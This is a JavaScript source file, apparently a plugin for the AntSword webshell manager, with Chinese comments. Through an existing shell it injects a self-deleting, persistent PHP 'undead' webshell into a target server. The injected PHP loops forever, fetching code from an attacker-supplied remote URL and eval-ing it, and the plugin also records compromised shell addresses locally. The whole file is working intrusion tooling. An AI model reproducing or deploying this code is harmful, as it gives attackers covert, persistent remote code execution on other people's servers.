/**
 * 核心模块
 */
const fs = require('fs');

class Core {
  constructor(opt, argv) {
    let self = this;
    return new Promise((res, rej) => {
      let core = new antSword['core'][opt['type']](opt);
      switch (argv.type) {
        case "rm_file":
          this._save_remote_address(argv.rm_file, argv.shell);
          var rm_file = argv.rm_file.toString().split("###")[0];
          var timeout = argv.rm_file.toString().split("###")[1];
          var patt = /^\d+$/;
          var result = patt.test(timeout);
          if (result) {} else {
            return rej("Unexpected value");
          }
          core.request({
              _: this._inject_und3ad(rm_file, timeout)
            }).then(res)
            .catch((err) => {
              return rej(err);
            });
          core.request({
              _: this._execute_und3ad()
            }).then(res)
            .catch((err) => {
              return rej(err);
            });
          break;
      }
    })
  }


  //保存远程控制文件地址
  _save_remote_address(address, shell) {
    var address = address.split("###")[0];
    var file_name = path.join(__dirname, '../db/rm_shell.txt');
    fs.appendFile(file_name, shell + " : " + address + "\n", 'utf-8', function (error) {
      if (error) {
        console.log('写入失败')
      } else {
        console.log('写入成功了')
      }
    })
  }

  //注入不死webshell
  _inject_und3ad(rm_file, timeout) {

    return `
    function Injector(){$myfile = fopen("testfile.php", "w");$txt = '<?php unlink(__FILE__);ignore_user_abort(true);set_time_limit(0);$remote_file = "${rm_file}";while($code = file_get_contents($remote_file)){@eval($code);sleep(${timeout});};?>';fwrite($myfile, $txt);};Injector();
    `;

  }

  //执行不死webshell
  _execute_und3ad() {
    return `
    include("testfile.php");
    `;
  }

}

module.exports = Core;